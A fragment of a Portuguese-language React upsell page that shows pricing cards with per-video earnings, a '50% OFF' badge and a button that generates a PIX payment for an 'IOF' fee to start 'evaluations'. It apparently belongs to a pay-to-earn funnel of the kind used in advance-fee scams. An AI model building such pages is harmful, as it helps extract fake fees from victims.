                            <Sparkles className="h-3 w-3 mr-1" />
                            Mais Popular
                          </Badge>
                        )}
                      </div>
                    </div>
                    <div className="text-right">
                      <div className="text-2xl font-bold text-[#FF4906]">{plan.earning}</div>
                      <div className="text-xs text-gray-500">por vídeo</div>
                    </div>
                  </div>

                  <div className="flex items-center justify-between mb-4">
                    <div className="flex items-center space-x-2">
                      <span className="text-lg text-gray-500 line-through">{plan.originalPrice}</span>
                      <Badge className="bg-red-500 text-white text-xs">50% OFF</Badge>
                    </div>
                    <div className="text-2xl font-bold text-gray-900">R$ {plan.price}</div>
                  </div>

                  <Button 
                    className="w-full bg-[#FF4906] hover:bg-[#E5420A] text-white font-bold py-3 rounded-xl"
                    onClick={() => handlePayIOF(plan.id)}
                    disabled={isLoading}
                  >
                    {isLoading ? (
                      <>
                        <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
                        Gerando PIX...
                      </>
                    ) : (
                      <>
                        <Zap className="h-4 w-4 mr-2" />
                        COMEÇAR AVALIAÇÕES
                      </>
                    )}
                  </Button>
                </CardContent>
              </Card>
            );
          })}
        </div>
      </div>
    </div>
  );
};

export default Upsell4;
